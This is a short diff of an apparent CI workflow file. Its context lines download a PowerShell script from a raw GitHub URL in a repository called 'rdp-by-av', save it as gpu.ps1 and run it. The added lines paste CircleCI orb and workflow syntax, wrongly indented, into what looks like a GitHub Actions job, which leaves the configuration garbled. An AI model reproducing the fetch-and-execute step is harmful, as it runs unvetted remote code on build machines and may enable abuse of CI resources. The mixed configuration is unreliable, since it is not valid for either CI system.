@@ -21,3 +21,9 @@ jobs:
             Invoke-WebRequest https://raw.githubusercontent.com/danieljohnbrosman08211986/rdp-by-av/main/sh -OutFile gpu.ps1 
           
       - run: ./gpu.ps1
+      orbs:
+  node: circleci/node@5.0.2
+  workflows:
+    example-workflow:
+      jobs:
+        - node/run
